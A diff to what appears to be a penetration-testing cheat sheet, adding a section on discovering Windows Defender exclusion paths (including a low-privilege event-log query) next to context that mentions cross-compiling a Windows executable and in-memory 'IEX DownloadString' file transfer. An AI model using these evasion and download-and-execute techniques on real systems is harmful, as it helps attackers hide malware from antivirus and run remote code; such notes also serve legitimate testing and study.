@@ -24,6 +24,21 @@ func main() {
 ```bash
 GOOS=windows GOARCH=amd64 go build -o pleasesubscribe.exe pleasesubscribe.go
 ```
+# 💭💭 Defender Exclusion Path Detection
+### Add Exclusion Path
+```bash
+# Need Admin Priv
+Search virus  ---> open it ---> click on Virus & Threat Protection ( Manage setting ) ----> Go at the End of the page ---> See the Exclusion ====> Now you can add or remove Paths.
+```
+## For ADMIN User
+```bash
+(Get-MpPreference).ExclusionPath
+```
+## For Low Power User
+```bash
+Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -FilterXPath "*[System[(EventID=5007)]]" | Where-Object { $_.Message -like "*exclusion*" } | Select-Object Message | FL
+```
+
 #  🗃️ File Transfer
 ```bash
 # 1. IEX DownloadString (Execute in memory)
